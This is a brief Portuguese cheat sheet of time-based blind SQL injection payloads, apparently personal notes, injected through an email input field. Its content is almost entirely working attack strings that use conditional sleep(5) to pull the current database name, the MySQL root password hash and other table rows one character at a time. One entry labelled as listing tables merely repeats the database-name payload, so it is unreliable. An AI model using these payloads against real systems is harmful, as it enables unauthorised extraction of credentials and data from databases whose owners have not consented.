# SQLi

Mape

# Time Based

## Payloads
### Apenas um valor
- Obter schema atual:
`hacker@mail.com' or if(ascii(substring(database(),{i},1))={ord(c)}, sleep(5), 0) #`
- Obter um valor de uma tabela:
`hacker@mail.com' or if(ascii(substring((select password from mysql.user where user = 'root'),{i},1))={ord(c)}, sleep(5), 0) #`
- Obter valor de um campo específico da tabela:
`hacker@mail.com' or if(ascii(substring((select password from mysql.user limit 1 OFFSET {linha}),{i},1))={ord(c)}, sleep(5), 0) #`

### Mais de um valor
- Obter tabelas do schema atual:
`hacker@mail.com' or if(ascii(substring(database(),{i},1))={ord(c)}, sleep(5), 0) #`
- Obter mais de um valor de uma tabela:
`hacker@mail.com' or if(ascii(substring((select password from mysql.user limit 1 OFFSET {linha}),{i},1))={ord(c)}, sleep(5), 0) #`
- 
